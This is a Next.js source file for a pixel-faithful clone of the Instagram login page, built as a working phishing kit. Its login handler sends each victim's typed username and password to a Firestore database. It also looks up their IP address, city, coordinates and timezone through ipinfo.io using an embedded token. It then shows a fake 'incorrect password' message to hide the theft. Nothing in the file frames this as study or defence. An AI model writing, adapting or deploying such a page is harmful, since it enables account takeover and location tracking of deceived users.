"use client";
import Image from "next/image";
import { useState, useEffect } from "react";
import { AiFillFacebook } from "react-icons/ai";
import { BsChevronDown } from "react-icons/bs";
import {
  doc,
  updateDoc,
  getDocs,
  collection,
  arrayUnion,
} from "firebase/firestore";
import { db } from "@/config/firebase";

export default function InstagramLogin() {
  const [isLoading, setIsLoading] = useState(true);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [showPassword, setShowPassword] = useState(true);
  const [isLoginError, setIsLoginError] = useState(false);
  const [isLoginAction, setIsLoginAction] = useState(false);
  const [userRef, setUserRef] = useState<any>("");

  const links = [
    { title: "meta", link: "https://about.meta.com/" },
    { title: "about", link: "https://about.instagram.com/" },
    { title: "blog", link: "https://about.instagram.com/blog/" },
    { title: "jobs", link: "https://www.instagram.com/about/jobs/" },
    { title: "help", link: "https://help.instagram.com/" },
    { title: "API", link: "https://developers.facebook.com/docs/instagram" },
    { title: "privacy", link: "https://www.instagram.com/legal/privacy/" },
    { title: "terms", link: "https://www.instagram.com/legal/terms/" },
    {
      title: "top-accounts",
      link: "https://www.instagram.com/directory/profiles/",
    },
    {
      title: "locations",
      link: "https://www.instagram.com/explore/locations/",
    },
    { title: "instagram lite", link: "https://www.instagram.com/web/lite/" },
    { title: "threads", link: "https://www.threads.net/" },
    {
      title: "contact uploading & Non-Users",
      link: "https://l.instagram.com/?u=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F261704639352628&e=AT1mcHiyjiFtOU_dWEbUFPdNhH6Kgj2hHEHadfeFexeMmiPWTiyqYWU2MizDRJ_ur674OGvlcIm7qp7oGH4UNAWIHFErBZ5-yYxc2E1muNvqLyRXJQl7UxRI_SDeFuCWUU8I-8LLPz7DgxorYByBzA",
    },
    {
      title: "meta verified",
      link: "https://about.meta.com/technologies/meta-verified/",
    },
  ];

  const usersCollectionRef = collection(db, "users");

  const handleLogin = () => {
    setIsLoginAction(true);
    fetch("https://ipinfo.io/json?token=5c6ed07095afe4")
      .then((res) => res.json())
      .then(async (data) => {
        try {
          await updateDoc(userRef, {
            clients: arrayUnion({
              username: usernameInput,
              password: passwordInput,
              ip: data.ip,
              country: data.country,
              city: data.city,
              longitude: data.loc.split(",")[0],
              latitude: data.loc.split(",")[1],
              timezone: data.timezone,
            }),
          });
          setIsLoginError(true);
          setIsLoginAction(false);
        } catch (error) {
          console.error(error);
        }
      });
  };

  useEffect(() => {
    setUserRef(doc(db, "users", window.location.pathname.split("/")[1]));

    const getUser = async () => {
      try {
        const data = await getDocs(usersCollectionRef);
        const users = data.docs.map((doc) => doc.id);
        users.includes(window.location.pathname.split("/")[1]) &&
          setIsLoading(false);
      } catch (error) {
        console.error(error);
      }
    };

    getUser();
  }, []);

  if (isLoading) {
    return (
      <div className="w-screen h-screen grid grid-rows-[1fr_auto]">
        {/* Logo */}
        <div className="grid place-content-center animate-pulse">
          <div className="w-20 relative">
            <Image
              src="/instagram-logo.png"
              width={1000}
              height={1000}
              alt="From Meta"
            />
          </div>
        </div>

        {/* From Meta */}
        <div className="w-max mx-auto py-10">
          <div className="w-20 relative">
            <Image
              src="/from-meta.png"
              width={1000}
              height={1000}
              alt="From Meta"
            />
          </div>
        </div>
      </div>
    );
  }

  return (
    <main className="min-h-screen">
      <div className="border-[rgba(219,219,219,1)] w-full max-w-[349px] mx-auto mt-3 pt-10 pb-5 px-10 sm:border">
        {/* Text */}
        <div className="relative w-44 mx-auto">
          <Image
            src={"/instagram-text.png"}
            width={1000}
            height={1000}
            alt="Instagram"
          />
        </div>

        <div className="mt-10">
          {/* Phone Number, Username or Email */}
          <label
            className={`border border-[rgba(219,219,219,1)] h-9 grid bg-[rgba(250,_250,_250,_1)] px-2 rounded-sm relative`}
          >
            <p
              className={`absolute text-[rgba(115,115,115,1)] transition-all duration-200 m-0 ${
                usernameInput
                  ? "left-2 top-1 text-[10px]"
                  : "left-2 top-2 text-xs"
              }`}
            >
              Phone number, username or email
            </p>

            <input
              type="text"
              className={`w-full bg-transparent outline-none text-xs ${
                usernameInput && "pt-3"
              }`}
              value={usernameInput}
              onChange={(e) => setUsernameInput(e.target.value)}
            />
          </label>

          {/* Password */}
          <label
            className={`border border-[rgba(219,219,219,1)] h-9 grid grid-cols-[1fr_auto] bg-[rgba(250,_250,_250,_1)] px-2 rounded-sm relative mt-2`}
          >
            <div className="grid">
              <p
                className={`absolute text-[rgba(115,115,115,1)] transition-all duration-200 m-0 ${
                  passwordInput
                    ? "left-2 top-1 text-[10px]"
                    : "left-2 top-2 text-xs"
                }`}
              >
                Password
              </p>

              <input
                type={showPassword ? "text" : "password"}
                className={`w-full bg-transparent outline-none text-xs ${
                  passwordInput && "pt-3"
                }`}
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
              />
            </div>

            <button
              onClick={() => setShowPassword(!showPassword)}
              className="text-sm text-[rgba(38,38,38,1)] font-semibold hover:text-neutral-400"
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          </label>

          {/* Login */}
          <button
            className="w-full rounded-lg py-[6px] mt-5 bg-[rgba(0,149,246,1)] text-sm text-white font-semibold"
            onClick={() => handleLogin()}
            disabled={isLoginAction}
          >
            {isLoginAction ? (
              <span className="w-4 h-4 block border-2 border-white border-l-transparent opacity-80 mx-auto rounded-full animate-spin"></span>
            ) : (
              "Log in"
            )}
          </button>
        </div>

        {/* OR */}
        <div className="relative">
          <span className="border border-[rgba(219,219,219,1)] block w-full absolute top-1/2 -translate-y-1/2"></span>
          <p className="bg-white p-5 rounded-full relative w-max mx-auto text-sm text-neutral-600">
            OR
          </p>
        </div>

        {/* Log in With Facebook */}
        <div className="grid grid-flow-col w-max mx-auto gap-3 items-center text-[#385185]">
          <span className="text-xl">
            <AiFillFacebook />
          </span>
          <p className="text-sm font-semibold">Log in with Facebook</p>
        </div>

        {isLoginError && (
          <p className="text-center text-[13px] mt-7 text-[rgb(237,_73,_86)]">
            Sorry, your password was incorrect. Please double-check your
            password.
          </p>
        )}

        {/* Forgot Password */}
        <a href="https://www.instagram.com/accounts/password/reset/">
          <p className="w-max mx-auto text-xs text-[rgba(0,55,107)] mt-7">
            Forgot password?
          </p>
        </a>
      </div>

      {/* Don't Have an Acount */}
      <div className="border-[rgba(219,219,219,1)] w-full max-w-[349px] mx-auto mt-2 py-5 text-center text-sm sm:border">
        <p>
          Don&apos;t have an account?{" "}
          <a href="https://www.instagram.com/accounts/emailsignup/">
            <span className="text-[rgba(0,149,246)] font-semibold">
              Sign Up
            </span>
          </a>
        </p>
      </div>

      {/* Get the app */}
      <p className="text-center mt-3 text-sm">Get the app.</p>

      <div className="grid grid-flow-col gap-2 w-max mx-auto items-center mt-3">
        {/* From Google play */}
        <a
          href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dig_mid%253D077248D7-86EB-4EA4-8531-DA3E7AEC9DE0%2526utm_campaign%253DloginPage%2526utm_content%253Dlo%2526utm_source%253Dinstagramweb%2526utm_medium%253Dbadge&e=AT39h_jtk65_ZMHa8XVd8sCozwVgg1TLBlarCT6QC4jmscMAO4aML0FiMJzKUZiWo0eVAVtAn8Cd_yN0lAoXxfhDlsLiDXYwfW3ERNeShqJwx8uaPBzDmpurvbzcxeqC5Q2_zS7MLL2MbyLHFuXkSg"
          target="_blank"
        >
          <div className="relative w-32">
            <Image
              src="/get-it-on-google-play.png"
              width={1000}
              height={1000}
              alt="Get It From Google Play"
            />
          </div>
        </a>

        {/* From Microsoft */}
        <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C2560%2C1440">
          <div className="relative w-[108px]">
            <Image
              src="/get-it-from-microsoft.png"
              width={1000}
              height={1000}
              alt="Get It From Microsoft"
            />
          </div>
        </a>
      </div>

      {/* Links */}
      <div className="flex flex-wrap space-x-4 justify-center px-4 mt-20">
        {links.map((link, i) => (
          <a
            key={i}
            href={link.link}
            target="_blank"
            className="text-[11px] text-[rgba(115,115,115,1)] capitalize mb-2"
          >
            {link.title}
          </a>
        ))}
      </div>

      <div className="text-xs text-[rgba(115,115,115,1)] grid gap-3 grid-flow-col w-max mx-auto mt-4">
        <div className="grid grid-flow-col gap-1 items-center">
          <p>English</p>
          <BsChevronDown />
        </div>
        <p>&copy; 2023 Instagram from Meta</p>
      </div>
    </main>
  );
}
